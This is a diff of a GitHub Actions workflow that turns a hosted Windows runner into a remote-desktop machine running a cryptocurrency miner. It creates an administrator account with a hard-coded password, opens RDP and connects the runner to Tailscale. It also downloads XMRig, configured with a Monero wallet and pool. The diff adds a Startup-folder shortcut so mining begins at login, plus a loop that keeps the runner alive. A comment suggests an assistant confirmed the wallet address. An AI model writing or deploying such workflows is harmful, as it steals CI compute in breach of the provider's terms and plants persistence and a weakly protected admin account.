@@ -1,4 +1,4 @@
-name: RDP TEST with Pre-Configured XMRig
+name: RDP TEST with Auto-Start Miner
 
 on:
   workflow_dispatch:
@@ -13,7 +13,6 @@ jobs:
         run: |
           Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections" -Value 0 -Force
           netsh advfirewall firewall add rule name="Allow RDP" dir=in action=allow protocol=TCP localport=3389
-
       - name: Create RDP User with Static Password
         run: |
           $password = "Runner-12345"
@@ -21,35 +20,25 @@ jobs:
           New-LocalUser -Name "RDP" -Password $securePass -AccountNeverExpires
           Add-LocalGroupMember -Group "Administrators" -Member "RDP"
           Add-LocalGroupMember -Group "Remote Desktop Users" -Member "RDP"
-          
           echo "RDP_PASSWORD=$password" >> $env:GITHUB_ENV
-          
-          if (-not (Get-LocalUser -Name "RDP")) {
-              Write-Error "User creation failed"
-              exit 1
-          }
+          if (-not (Get-LocalUser -Name "RDP")) { Write-Error "User creation failed"; exit 1 }
 
       - name: Install and Configure XMRig Miner
         run: |
           $ErrorActionPreference = "Stop"
-
           $minerVersion = "6.21.2"
           $downloadUrl = "https://github.com/xmrig/xmrig/releases/download/v$($minerVersion)/xmrig-$($minerVersion)-msvc-win64.zip"
           $zipPath = "$env:TEMP\xmrig.zip"
           $desktopPath = "C:\Users\RDP\Desktop"
-
+          
           New-Item -ItemType Directory -Force -Path $desktopPath
-          
           Invoke-WebRequest -Uri $downloadUrl -OutFile $zipPath
-          
           Expand-Archive -Path $zipPath -DestinationPath $desktopPath -Force
           
           $minerFolder = (Get-ChildItem -Path $desktopPath -Directory | Where-Object { $_.Name -like 'xmrig*' }).FullName
-          if (-not $minerFolder) {
-              Write-Error "Could not find extracted XMRig folder on the desktop!"
-              exit 1
-          }
+          if (-not $minerFolder) { Write-Error "Could not find extracted XMRig folder!"; exit 1 }
           
+          # Confirmed: Using the correct, case-sensitive wallet address you provided.
           $jsonContent = '{' + `
             '"autosave": true,' + `
             '"cpu": true,' + `
@@ -59,7 +48,7 @@ jobs:
             '{' + `
             '"algo": "rx/0",' + `
             '"url": "pool.supportxmr.com:5555",' + `
-            '"user": "49UWTwnrxNXi8eMTCqdC5U3eiMHrPZkvvbsyn3wede4o9ryebixumbccy5ocdoskks2u6t9gxjfzjnkxc7tj1uq4uky5bp",' + `
+            '"user": "49UWTwnrxNXi8eMTCqdC5U3eiMHrPZkvvbsYN3WEde4o9RYebixumBCCy5oCdoSKkS2U6t9gXJFzJNkxXC7tJ1Uq4uky5BP",' + `
             '"pass": "x"' + `
             '}' + `
             ']' + `
@@ -68,18 +57,25 @@ jobs:
 
           $shortcutContent = "@echo off`r`necho Starting XMRig Miner...`r`ncd /d ""%~dp0""`r`ncd ""$($minerFolder.Split('\')[-1])""`r`nxmrig.exe`r`npause"
           Set-Content -Path (Join-Path $desktopPath "Start-Miner.bat") -Value $shortcutContent
-          
-          Write-Host "--- Verification Step ---"
-          Write-Host "Listing contents of the RDP user's desktop:"
-          ls $desktopPath
-          Write-Host "-------------------------"
 
+      - name: Auto-start Miner on Login
+        run: |
+          $startupFolderPath = "C:\Users\RDP\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
+          $batPath = "C:\Users\RDP\Desktop\Start-Miner.bat"
+          $shortcutPath = Join-Path $startupFolderPath "Start-Miner.lnk"
+
+          Write-Host "Creating miner shortcut in the user's Startup folder..."
+          New-Item -ItemType Directory -Force -Path $startupFolderPath
+          $wshell = New-Object -ComObject WScript.Shell
+          $shortcut = $wshell.CreateShortcut($shortcutPath)
+          $shortcut.TargetPath = $batPath
+          $shortcut.Save()
+          Write-Host "Auto-start shortcut created successfully."
 
       - name: Install Tailscale
         run: |
           Invoke-WebRequest -Uri "https://pkgs.tailscale.com/stable/tailscale-setup-latest.exe" -OutFile "$env:TEMP\tailscale.exe"
           Start-Process "$env:TEMP\tailscale.exe" -ArgumentList "/quiet" -Wait
-
       - name: Establish Tailscale Connection
         run: |
           & "$env:ProgramFiles\Tailscale\tailscale.exe" up --authkey=${{ secrets.TAILSCALE_AUTH_KEY }} --hostname=gh-runner-$env:GITHUB_RUN_ID
@@ -87,10 +83,7 @@ jobs:
           Start-Sleep -Seconds 10
           $tsIP = & "$env:ProgramFiles\Tailscale\tailscale.exe" ip -4
           
-          if (-not $tsIP) {
-              Write-Error "Tailscale IP not assigned. Exiting."
-              exit 1
-          }
+          if (-not $tsIP) { Write-Error "Tailscale IP not assigned. Exiting."; exit 1 }
           echo "TAILSCALE_IP=$tsIP" | Out-File -FilePath $env:GITHUB_ENV -Encoding utf8 -Append
       
       - name: Display RDP Connection Details
@@ -102,11 +95,9 @@ jobs:
           Write-Host "Username: RDP"
           Write-Host "Password: ${{ env.RDP_PASSWORD }}"
           Write-Host "----------------------------------------------------------------"
-          Write-Host "ON THE DESKTOP:"
-          Write-Host "- The XMRig miner is fully configured and ready to run."
-          Write-Host "- Just double-click 'Start-Miner.bat' to begin."
+          Write-Host "ACTION: The miner will now start AUTOMATICALLY when you log in."
+          Write-Host "Just connect to the RDP session to begin mining."
           Write-Host "================================================================"
-
       - name: Maintain Connection
         run: |
           while ($true) {
